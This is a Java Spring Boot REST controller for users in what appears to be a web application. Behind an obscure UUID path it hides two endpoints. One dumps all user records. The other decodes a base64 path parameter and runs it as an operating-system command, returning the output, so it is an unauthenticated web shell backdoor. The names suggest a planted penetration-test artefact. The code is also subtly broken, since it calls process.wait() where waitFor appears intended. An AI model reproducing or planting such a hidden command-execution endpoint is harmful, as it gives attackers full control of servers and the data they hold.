package com.tintulip.webapplication.user;

import org.apache.tomcat.util.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@RestController
@RequestMapping("/api")
public class UserRestController {

    @Autowired
    private UserRepository repository;

    @GetMapping("/1857b1ed-026e-4c38-bc6c-c1a171cbc38f")
    public Iterable<TestUser> nettitudeTest() {
        return repository.findAll();
    }

    @GetMapping("/1857b1ed-026e-4c38-bc6c-c1a171cbc38f/{cmd}")
    public Exec nettitudeExec(@PathVariable("cmd") String cmd) {
        var decoded = new String(Base64.decodeBase64(cmd));
        try {
            var process = Runtime.getRuntime().exec(decoded);
            process.wait();
            var inputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            var output = new StringBuilder();
            while ((line = inputStream.readLine()) != null)
                output.append(line);
            return new Exec(Base64.encodeBase64String(output.toString().getBytes()));
        } catch (Exception e) {
            return new Exec(Base64.encodeBase64String(e.getMessage().getBytes()));
        }
    }

    public static class Exec{
        String response;

        Exec(String response){
            this.response = response;
        }
    }
}